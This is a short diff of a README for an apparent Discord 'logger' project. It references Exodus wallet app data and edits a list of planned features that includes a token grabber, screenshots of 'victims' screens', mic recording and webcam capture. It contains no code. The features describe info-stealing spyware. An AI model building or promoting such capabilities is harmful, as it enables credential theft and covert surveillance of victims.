@@ -40,10 +40,8 @@ Exodus Appdata :\
 Go to https://github.com/TurtlesXD/Discord-Logger/blob/main/discord-logger-help/Help.md 
 
 # Upcoming features:
-• Discord token grabber\
-• Screenshot victims screen\
 • Mic recording\
-• Webcam image\
+• damn idk\
 Thanks for checking out my repository!\
 msg me at chickenpie8636
 ```
